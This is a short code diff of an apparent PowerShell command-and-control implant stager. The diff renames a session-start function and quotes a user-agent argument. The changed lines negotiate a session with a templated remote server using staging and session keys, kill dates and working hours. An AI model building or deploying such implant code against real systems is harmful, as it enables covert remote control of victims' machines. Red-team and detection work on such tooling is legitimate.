@@ -249,7 +249,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Begin-Chess -myserver @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
+    Start-Chess -myserver @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -s "$hom" -SK '{{ staging_key }}' -UA $aua -hop "$hop";
+Start-Negotiate -s "$hom" -SK '{{ staging_key }}' -UA "$aua" -hop "$hop";
